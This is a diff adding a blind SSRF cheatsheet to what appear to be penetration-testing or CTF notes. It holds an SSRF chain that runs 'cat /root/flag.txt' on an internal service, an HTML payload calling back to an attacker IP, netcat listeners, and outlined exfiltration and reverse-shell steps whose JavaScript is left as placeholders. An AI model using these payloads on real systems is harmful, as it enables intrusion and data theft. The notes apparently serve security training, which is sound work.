@@ -119,4 +119,70 @@
    - Retrieve flag:
      ```bash
      curl -i -s "http://$TARGET/load?q=http://$INTERNAL/load?q=http::////127.0.0.1:5000/runme?x=cat%2520/root/flag.txt"
+
      ```
+
+# Blind SSRF Cheatsheet
+
+### Introduction:
+
+- **Blind SSRF:** Vulnerability where SSRF is present but not displayed on the front end.
+- **Detection:** Test if the server processes requests to external resources (own services or Burp Collaborator).
+
+### Exploitation:
+
+1. **Payload Creation:**
+   - Create an HTML file (payload) for the application.
+   ```html
+   <!DOCTYPE html>
+   <html>
+   <body>
+     <a>Hello World!</a>
+     <img src="http://<10.10.15.54:5555/x?=viaimgtag">
+   </body>
+   </html>
+   ```
+   
+2. **Netcat Listener:**
+   - Set up Netcat listener: `nc -lnvp 5555`
+
+3. **Upload HTML File:**
+   - Upload the HTML file to the target.
+   - Confirm vulnerability if response seen in Netcat listener.
+
+4. **Exfiltration via Blind SSRF:**
+   - Create HTML file for exfiltration.
+   ```html
+   <html>
+       <body>
+           <b>Exfiltration via Blind SSRF</b>
+           <script>
+           // JavaScript code for exfiltration
+           </script>
+        </body>
+   </html>
+   ```
+   - Set up Netcat listener.
+   - Upload HTML file and decode the obtained data.
+
+5. **Leverage wkhtmltopdf:**
+   - wkhtmltopdf's vulnerability for server takeover.
+   - Create HTML file for file reading and exfiltration.
+
+6. **Reverse Shell via Blind SSRF:**
+   - Create HTML file for reverse shell.
+   ```html
+   <html>
+       <body>
+           <b>Reverse Shell via Blind SSRF</b>
+           <script>
+           // JavaScript code for reverse shell
+           </script>
+       </body>
+   </html>
+   ```
+   - Set up Netcat listener: `nc -lnvp 5555`
+   - Upload HTML file to get a reverse shell.
+
+
+*Note: Always ensure ethical and legal use of these techniques. Unauthorized access and exploitation of systems is against the law.*
